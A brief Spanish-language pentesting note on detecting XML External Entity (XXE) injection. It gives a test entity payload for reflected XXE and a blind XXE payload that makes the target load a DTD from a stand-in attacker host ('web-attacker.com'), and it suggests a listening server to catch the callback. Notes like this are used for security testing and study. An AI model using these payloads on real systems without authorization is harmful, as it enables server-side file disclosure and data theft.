
Cuando vejos que se envia un documento utilizando XML, podemos hacernos a la idea de un posible XXE (XML External Entity), podemos comprobar esta vulnerabilidad inyectando en el DOCTYPE una entidad malintencionada:

```ruby
<!DOCTYPE foo [ <!ENTITY xxe "test"> ]>
```

y luego llamar a esta entidad con:

```ruby
&xxe;
```

Para confirmar un XXE deberia aparecer el valor que le dimos a la entidad en donde la inyectamos es decir "test".


# Si no se reflejan

En este caso estamos en frente de un Blind XXE, lo cual podemos afrontar usando el siguiente payload:

```ruby
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

Debemos iniciar un servidor, ya sea de python o con Collaborator.






